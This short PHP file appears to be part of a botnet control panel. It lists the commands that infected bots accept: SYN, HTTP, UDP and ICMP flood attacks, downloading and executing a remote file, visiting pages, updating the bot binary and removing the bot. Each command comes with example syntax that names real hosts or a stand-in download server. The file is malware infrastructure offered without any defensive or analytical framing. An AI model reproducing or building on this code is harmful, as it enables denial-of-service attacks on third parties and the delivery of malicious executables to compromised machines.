<?php
	$Commands = array(
		'SYN-Flood'=>'synflood*Host*Port*Threads*Sockets<br />For example: synflood*google.com*80*2*2',
		'HTTP-Flood'=>'httpflood*Host*Threads<br />For example: httpflood*http://www.google.com/*5',
		'UDP-Flood'=>'udpflood*Host*Port*Threads*Sockets*PacketSize<br />For example: udpflood*google.com*80*2*2*1024',
		'ICMP-Flood'=>'icmpflood*Host*Threads*Sockets*PacketSize<br />For example: icmpflood*google.com*2*2*1024',
		'Download and Execute'=>'download*LinkToFile<br />For example: download*http://www.yourserver.com/yourfile.exe',
		'Visit Page'=>'visit*Link<br />For example: visit*http://www.google.de/',
		'Bot Update'=>'update*LinkToFile<br />For example: update*http://www.yourserver.com/newbot.exe',
		'Remove Bot'=>'remove*Name<br />For example: remove*Admin-PC',
		);
?>